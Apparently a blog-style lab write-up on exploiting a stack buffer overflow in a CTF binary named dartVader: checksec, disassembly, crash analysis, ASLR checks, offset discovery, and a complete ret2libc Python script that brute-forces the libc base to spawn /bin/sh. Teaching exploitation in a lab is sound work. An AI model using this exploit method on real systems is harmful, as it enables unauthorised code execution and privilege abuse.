---
title: Analyzing Buffer Overflow
date: 2026-02-06T21:00:00+08:00
draft: false
toc: true
images:
tags:
  - English
---
## gdb-peda Analysis

PEDA stands for Python Exploit Development Assistance. It is a tool built on top of GDB  and written in python,designed to assist with exploit develoment. Its primary goal is to make vulnerability analysis and exploit development more intuitive and efficient. By enhancing GDB's functionality-such as providing improved visual displays for the stack,registers and memory. as well as offering practical untilities for binary analysis-it hels security researchers understand and exploit program vulnerabilities more rapidly. Since exploit development often requires meticulous analysis of the program's execution state,memory layout,and decomplied code,the enhanced features of gdb-peda are particularly important for significantly boosting the efficientcy of debugging and exoploitation.

### Downloading gdb-peda

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo apt install gdb-peda
gdb-peda is already the newest version (1.2-0kali2).
The following packages were automatically installed and are no longer required:
  gcc-14-base:i386         libblkid-dev   libgio-2.0-dev-bin     libicu-dev     libpython3.12-minimal  libsepol-dev              native-architecture  python3-poetry-dynamic-versioning  python3.12-tk
  gir1.2-girepository-2.0  libflac12t64   libgirepository-1.0-1  liblbfgsb0     libpython3.12-stdlib   libsysprof-capture-4-dev  python3-aioconsole   python3-pywerview                  ruby-zeitwerk
  girepository-tools       libfuse3-3     libglapi-mesa          libplacebo349  libpython3.12t64       libutempter0              python3-dunamai      python3-setproctitle               strongswan
  icu-devtools             libgeos3.13.0  libglib2.0-dev-bin     libpoppler145  librav1e0.7            libx264-164               python3-nfsclient    python3-tomlkit
Use 'sudo apt autoremove' to remove them.

Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 1420
```

### Starting the Analysis

First,locate the PEDA installation directory.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ locate gdb-peda
/usr/share/gdb-peda
/usr/share/doc/gdb-peda
/usr/share/doc/gdb-peda/README.Debian
/usr/share/doc/gdb-peda/README.md
/usr/share/doc/gdb-peda/changelog.Debian.gz
/usr/share/doc/gdb-peda/copyright
/usr/share/gdb-peda/lib
/usr/share/gdb-peda/peda.py
/usr/share/gdb-peda/lib/config.py
/usr/share/gdb-peda/lib/nasm.py
/usr/share/gdb-peda/lib/shellcode.py
/usr/share/gdb-peda/lib/six.py
/usr/share/gdb-peda/lib/skeleton.py
/usr/share/gdb-peda/lib/utils.py
/var/lib/dpkg/info/gdb-peda.list
/var/lib/dpkg/info/gdb-peda.md5sums

┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls /usr/share/gdb-peda   
lib  peda.py
```

Launch PEDA within GDB

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ gdb dartVader                                                   
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 201 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from dartVader...
(No debugging symbols found in dartVader)
------- tip of the day (disable with set show-tips off) -------
Use patch <address> '<assembly>' to patch an address with given assembly code
pwndbg> source /usr/share/gdb-peda/peda.py
gdb-peda$ 
```

#### Checksec

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

The results of checksec reflect the security configuration of the target binary,revealing both vulnerabilities and protections.

First, Canary and FORTIFY are disabled. This indicates a lack of built-in defenses against stack overflows and buffer manipulation, meaning we might be able to exploit there flaws for an overflow attack.NX is enable, which prevents code execution in certain memory regions, offering some protection against injection-style arracks. However,PIE is disabled, meaning the program's load address is fixed. This partially mitigates the security advantage of Address Space Layout Randomization.Finally,RELRO is only partial, meaning the relocation information isn't fully locaked down, leaving room for potential memory leaks or modification attacks.

##### CANARY (Stack Canary)

A Canary is a sentinel value placed before the function return address to detect stack overflows. If this value is corrupted, it indicates that a buffer overflow has occurred. Compilers place a random value on the stack at the start of a function and verify it before the function returns. If the value has changed, the program terminates. If this is disabled, an attacker can directly overwrite the return address.

##### FORTIFY (Source Fortification)

FORTIFY checks for dangerous functions and detects buffer overflows at runtime. If an overflow is detected, the program terminates. If disabled, using unsafe functions becomes prone to issues.

##### NX (No-Execute)

NX (No-Execute), also known as DEP (Data Execution Prevention), marks memory regions as either data or instructions. When enabled, data on the stack and heap cannot be executed as code. If an attacker injects shellcode onto the stack, the CPU will refuse to execute it. Bypassing this usually requires techniques like ROP (Return Oriented Programming).

##### PIE (Position Independent Executable)

PIE works in conjunction with ASLR (Address Space Layout Randomization) to load the program into random memory locations every time it runs. This prevents attackers from predicting the specific addresses of functions and variables, significantly increasing the difficulty of exploitation.

##### RELRO (Relocation Read-Only)

RELRO protects the GOT (Global Offset Table) from being overwritten. It has two modes:

1. **Partial RELRO:** Places the GOT before the BSS section to prevent global variable overflows from overwriting the GOT, but the GOT itself remains writable.
2. **Full RELRO:** Resolves all symbols at startup and marks the entire GOT as read-only, completely preventing GOT overwrite attacks.

#### Disassemble

Analyzing the disassembly of the main function:

```bash
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0804844d <+0>:     push   ebp
   0x0804844e <+1>:     mov    ebp,esp
   0x08048450 <+3>:     and    esp,0xfffffff0
   0x08048453 <+6>:     sub    esp,0x50
   0x08048456 <+9>:     cmp    DWORD PTR [ebp+0x8],0x1
   0x0804845a <+13>:    jne    0x8048470 <main+35>
   0x0804845c <+15>:    mov    DWORD PTR [esp+0x4],0x8048520
   0x08048464 <+23>:    mov    DWORD PTR [esp],0x1
   0x0804846b <+30>:    call   0x8048340 <errx@plt>
   0x08048470 <+35>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048473 <+38>:    add    eax,0x4
   0x08048476 <+41>:    mov    eax,DWORD PTR [eax]
   0x08048478 <+43>:    mov    DWORD PTR [esp+0x4],eax
   0x0804847c <+47>:    lea    eax,[esp+0x10]
   0x08048480 <+51>:    mov    DWORD PTR [esp],eax
   0x08048483 <+54>:    call   0x8048310 <strcpy@plt>
   0x08048488 <+59>:    leave
   0x08048489 <+60>:    ret
End of assembler dump.
```

This represents the low-level instruction sequence of the `main` function in x86 assembly language. Let's break down the logic and functionality.

The output is divided into four parts:

1. The actual memory address (e.g., `0x0804844d`).
2. The offset within the function (e.g., `<+0>:`), indicating bytes from the entry point.
3. The mnemonic (e.g., `push`, `mov`), indicating the operation.
4. The operands (e.g., `esp,0x50`), specifying registers or addresses involved.

Overall, this is the assembly representation of a C program's main function. It checks the number of command-line arguments. If specific conditions are met, it calls the `errx` function (error exit); otherwise, it copies a command-line argument into a buffer on the stack using `strcpy`.

##### Assembly Language Basics

| 汇编命令  | 命令来源                           | 解释                                             |
| ----- | ------------------------------ | ---------------------------------------------- |
| push  | Push（推）                        | 将操作数压入栈顶，栈指针（esp）减小，通常用于保存寄存器值或传递参数。           |
| mov   | Move（移动）                       | 将源操作数的值复制到目标操作数，可以是寄存器、内存或立即数，用于数据传输。          |
| and   | And（与）                         | 对两个操作数执行按位与运算，结果存入目标操作数，常用于位操作或地址对齐。           |
| sub   | Subtract（减）                    | 从目标操作数中减去源操作数，结果存入目标操作数，用于计算或调整栈指针。            |
| cmp   | Compare（比较）                    | 比较两个操作数，通过减法设立标志位（不保存结果），用于条件判断。               |
| jne   | Jump if Not Equal（不相等则跳转）      | 如果不相等（零标志 ZF=0），跳转到指定地址，用于算数运算或地址偏移。           |
| call  | Call（调用）                       | 调整子程序，将下一条指令地址压栈并跳转到目标地址，常用于函数调用。              |
| add   | Add（加）                         | 将源操作数加到目标操作数上，结果存入目标操作数，用于算数运算或地址偏移。           |
| lea   | Load Effective Address（加载有效地址） | 计算有效地址并存入寄存器，不访问内存，仅用于地址计算。                    |
| leave | Leave（离开）                      | 恢复调用者的栈帧，相当于 mov esp,ebp 后 pop ebp，用于函数返回前的栈清理 |
| ret   | Return（返回）                     | 从栈顶弹出返回地址并跳转到该地址，结束当前函数执行。                     |

| 寄存器 | 寄存器来源/全拼                             | 解释                                          |
| --- | ------------------------------------ | ------------------------------------------- |
| ebp | Extended Base Pointer（扩展基指针）         | 基指针寄存器，通常保存当前函数的栈帧地址，用于访问局部变量、参数或维护栈帧结构。    |
| esp | Extended Stack Pointer（扩展栈指针）        | 栈指针寄存器，指向当前栈顶，用于管理栈的增长和收缩（如分配空间或传递参数）。      |
| eax | Extended Accumulator（扩展累加器）          | 累加器寄存器，常用于存储函数返回值、算数运算结果或作为通用数据寄存器。         |
| ebx | Extended Base（扩展基址寄存器）               | 基址寄存器，通用寄存器，常用于存储内存地址或数据，在某些调用约定中需要被调用者保存。  |
| ecx | Extended Counter（扩展计数器）              | 计数器寄存器，常用于循环计数（如 loop 指令）、字符串操作或作为同样寄存器。    |
| edx | Extended Data（扩展数据寄存器）               | 数据寄存器，常用于存储数据、I/O 操作，在乘除法中与 eax 配合存储扩展结果。   |
| esi | Extended source Index（扩展源索引）         | 源索引寄存器，常用于字符串操作的源地址指针或数组访问                  |
| edi | Extended Destination Index（扩展目标索引）   | 目标索引寄存器，常用于字符串操作的目标地址指针或数组访问。               |
| dip | Extended Instruction Pointer（扩展指令指针） | 指令指针寄存器，指向下一条要执行的指令地址，不能直接修改，只能通过跳转/调用命令改变。 |

> Note: The principles above apply similarly if using pwndbg._

## Manual Buffer Overflow Testing

```bash
erso@deathStar1:~$ /bin/dartVader
dartVader: Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...

erso@deathStar1:~$ /bin/dartVader -h
erso@deathStar1:~$ /bin/dartVader asdsdadfgeyghujfgeahjkfghaekhfhaeukjfhjaelif
erso@deathStar1:~$ /bin/dartVader $(python3 -c 'print("A"*10)')
erso@deathStar1:~$ /bin/dartVader $(python3 -c 'print("A"*100)')
Segmentation fault (core dumped)
```

We encounter an error: **Segmentation fault**. This occurs when a program attempts to access illegal memory addresses, such as reading/writing unallocated memory, accessing memory out of array bounds, dereferencing null/uninitialized pointers, or accessing protected system memory. When the OS detects this, it triggers a "segfault" and aborts the program. "Core Dumped" means the system generated a file recording the memory state at the moment of the crash.

`/bin/dartVader` accessed illegal memory when handling 100 'A's, likely due to a buffer overflow or improper handling of long inputs.

```bash
erso@deathStar1:~$ dmesg |tail
[   10.915276] audit: type=1400 audit(1767178920.659:12): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="/usr/lib/connman/scripts/dhclient-script" pid=949 comm="apparmor_parser"
[   10.915355] audit: type=1400 audit(1767178920.659:13): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="/usr/lib/connman/scripts/dhclient-script" pid=949 comm="apparmor_parser"
[   10.917154] audit: type=1400 audit(1767178920.659:14): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/sbin/tcpdump" pid=951 comm="apparmor_parser"
[   11.063447] init: Failed to spawn thermald main process: unable to execute: No such file or directory
[   11.604512] ip_tables: (C) 2000-2006 Netfilter Core Team
[   11.654002] ip6_tables: (C) 2000-2006 Netfilter Core Team
[   11.865732] init: plymouth-upstart-bridge main process ended, respawning
[ 2566.209708] pcnet32 0000:02:01.0 eth0: link down
[ 2576.209677] pcnet32 0000:02:01.0 eth0: link up
[ 6771.328578] dartVader[2743]: segfault at 41414141 ip 41414141 sp bf80b560 error 14
```

> `dmesg` (diagnostic message) is used to view and print the Linux kernel message buffer.

The last line is relevant to `dartVader`. The process (PID 2743) segfaulted at timestamp 6771.328578. Specifically, the error occurred at memory address `0x41414141` (which is 'AAAA' in Hex—our input). The program tried to execute instructions at this illegal address. The stack pointer (`sp`) was at `0xbf80b560`. Error code 14 indicates a page fault, specifically caused by accessing a non-executable memory region.

We can confirm a buffer overflow vulnerability exists. Typically, we would write shellcode, but we must check if security mechanisms allow execution. The available protections dictate our exploitation method.

```bash
erso@deathStar1:~$ readelf -W -l /bin/dartVader | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```

`readelf` displays information about ELF files. `-l` shows program headers, and `-W` uses wide output.

The permissions for `GNU_STACK` are `RW` (Read/Write), but not `X` (Execute). This means the stack is marked as non-executable (NX/DEP enabled). This is a modern security feature designed to prevent attackers from injecting and executing malicious code on the stack. You can also use `scanelf` in Kali to check attributes:

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ scanelf -e dartVader 
 TYPE   STK/REL/PTL FILE 
ET_EXEC RW- R-- RW- dartVader 
```

## Dynamic Library Dependencies

Checking the program's dynamic link libraries:

```bash
erso@deathStar1:~$ ldd /bin/dartVader 
        linux-gate.so.1 =>  (0xb76e6000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb752a000)
        /lib/ld-linux.so.2 (0xb76e8000)
```

`ldd` lists the shared libraries required by the program at runtime. The output shows `linux-gate.so.1`, `libc.so.6`, and the loader `/lib/ld-linux.so.2`. This confirms the program is dynamically linked and relies on these system libraries. From a security perspective, this helps us understand the environment and potential attack surface (e.g., vulnerable library versions).

`libc` is the standard C library, fundamental to most C programs. It contains functions for memory management, string processing, system calls, etc. In Linux, `glibc` is the implementation. Since the program calls `libc` functions, these functions (like `system`) are present in memory and can be leveraged for a **Ret2Libc** attack.

### Ret2Libc Introduction

**Ret2Libc** (Return-to-Libc) is an attack technique used when a buffer overflow exists but stack execution is blocked (NX/DEP). Instead of injecting new code, the attacker overwrites the return address to jump to an existing function in the `libc` library (e.g., `system`) to execute arbitrary commands. This bypasses NX because the code being executed is part of the legitimate, executable library, not injected data on the stack.

The traditional method involves injecting shellcode onto the stack and jumping to it. However, with NX enabled, the stack is non-executable. Attackers realized that standard libraries (like `libc`) are already loaded in memory and marked as executable. Thus, Ret2Libc was born: why inject code when you can just call existing functions?

To perform a Ret2Libc attack, several conditions are met:

1. A vulnerability (like buffer overflow) allows control over the return address.
    
2. The program is dynamically linked to `libc`.
    
3. We must be able to leak or predict the addresses of `libc` functions (defeating ASLR).
    
4. If NX is enabled, Ret2Libc is the primary way to achieve code execution without ROP.
    

#### ASLR

**ASLR** (Address Space Layout Randomization) randomly assigns the memory locations of the heap, stack, shared libraries, and executable segments every time the program runs. This makes it difficult for attackers to predict the location of shellcode or functions.

#### NX/DEP

**NX/DEP** (No-Execute / Data Execution Prevention) marks memory areas (stack/heap) as non-executable. It prevents the execution of injected shellcode.

### ASLR Assessment

Every time we run `ldd`, we can see the memory addresses changing:

```bash
erso@deathStar1:~$ ldd /bin/dartVader 
        linux-gate.so.1 =>  (0xb77d1000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7615000)
        /lib/ld-linux.so.2 (0xb77d3000)
erso@deathStar1:~$ ldd /bin/dartVader
        linux-gate.so.1 =>  (0xb77a9000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75ed000)
        /lib/ld-linux.so.2 (0xb77ab000)
```

This is a typical sign of ASLR. Let's verify:

```bash
erso@deathStar1:~$ cat /proc/sys/kernel/randomize_va_space 
2
```

Yes, ASLR is fully active (value `2`).

- **0:** Off. Addresses are fixed.
- **1:** Partial randomization.
- **2:** Full randomization.

We can try to disable it, but usually, we don't have permission:

```bash
erso@deathStar1:~$ echo 0 > /proc/sys/kernel/randomize_va_space
-bash: /proc/sys/kernel/randomize_va_space: Permission denied
```

```bash
erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|exit)"
   111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   243: 0011b8a0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   446: 000336d0   268 FUNC    GLOBAL DEFAULT   12 __cxa_thread_atexit_impl@@GLIBC_2.18
   554: 000b8634    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
   609: 0011e780    56 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
   620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
   645: 00033660    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
   868: 00033490    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
  1037: 00128ce0    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
  1380: 001ad204     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
  1492: 000fb610    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
  2090: 001ad154     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
  2243: 00033290    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
  2386: 000fc180     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
```

he output confirms the relative positions of `system` and `exit` in the library.

## Writing the Exploit

### Determining Buffer Size

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ./dartVader Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
zsh: segmentation fault  ./dartVader 
                                                                                                                              
┌──(kali㉿kali)-[~/Work/Kali]
└─$ dmesg | tail            
[  239.138010] e1000 0000:02:01.0 eth0: entered promiscuous mode
[  280.639404] e1000 0000:02:01.0 eth0: left promiscuous mode
[  282.078779] e1000 0000:02:01.0 eth0: entered promiscuous mode
[  288.329418] e1000 0000:02:01.0 eth0: left promiscuous mode
[  299.600495] e1000 0000:02:01.0 eth0: entered promiscuous mode
[  419.601025] e1000 0000:02:01.0 eth0: left promiscuous mode
[ 2735.339190] e1000: eth0 NIC Link is Down
[ 2739.367371] e1000: eth0 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: None
[12358.851973] dartVader[103250]: segfault at 63413563 ip 0000000063413563 sp 00000000ff8cde70 error 14 likely on CPU 1 (core 1, socket 0)
[12358.851987] Code: Unable to access opcode bytes at 0x63413539.
```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ msf-pattern_offset -l 100 -q 0x63413563        
[*] Exact match at offset 76
```

The overflow offset is **76** bytes.

Next, we need the addresses of the functions we want to call.

```bash
erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|exit)"
   111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   243: 0011b8a0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   446: 000336d0   268 FUNC    GLOBAL DEFAULT   12 __cxa_thread_atexit_impl@@GLIBC_2.18
   554: 000b8634    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
   609: 0011e780    56 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
   620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
   645: 00033660    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
   868: 00033490    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
  1037: 00128ce0    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
  1380: 001ad204     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
  1492: 000fb610    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
  2090: 001ad154     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
  2243: 00033290    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
  2386: 000fc180     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
```

```bash
erso@deathStar1:~$ ldd /bin/dartVader 
        linux-gate.so.1 =>  (0xb76e1000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7525000)
        /lib/ld-linux.so.2 (0xb76e3000)
erso@deathStar1:~$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep -E /bin/sh
 162d4c /bin/sh
```

**Addresses found (offsets):**

- `exit`: `0x33260`
- `system`: `0x40310`
- `/bin/sh`: `0x162d4c`

**Exploit Script:**

Since ASLR is enabled, the base address of `libc` changes. However, on 32-bit systems, the randomization entropy isn't massive. We can pick a likely base address (observed from previous `ldd` runs) and loop the exploit until the randomization aligns with our hardcoded address.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ vim ret2libc.py
                                                                                                                              
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat ret2libc.py 
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from struct import pack
from subprocess import call

offset = b"A" * 76
libc = 0xb75c9000
system = pack("<I", libc + 0x40310)
exit = pack("<I", libc + 0x33260)
sh = pack("<I",libc + 0x162d4c)

buffer = offset + system + exit + sh
app = b"/bin/dartVader"

for i in range(1024):
    print("Attemp %d" % i)
    ret = call([app,buffer])
    if ret == 0:
        print("[+] Success!!!")
        break
    else:
        print("[-] Failed")
```

**How the buffer is constructed:**

1. **Offset:** Fills the buffer up to the return address.
2. **System:** Overwrites the return address with the address of `system()`.
3. **Exit:** Acts as the return address for `system()`. In x86 calling convention, the stack looks like `[Function Address] [Return Address] [Argument 1]`. When `system` finishes, it will "return" to `exit`, preventing a crash.
4. **Sh:** The argument for `system` (`/bin/sh`).

We use `struct.pack("<I", ...)` to convert the integer addresses into Little Endian binary format (4-byte unsigned integer), which allows them to be correctly written into memory to overwrite the return address.

The loop uses `subprocess.call` to launch the target program with our payload repeatedly. It checks the return code (`ret`). If it returns 0, the exploit likely succeeded (or at least exited cleanly via our `exit` call).

**Result:** Success!

![Pa1](Pa1.png)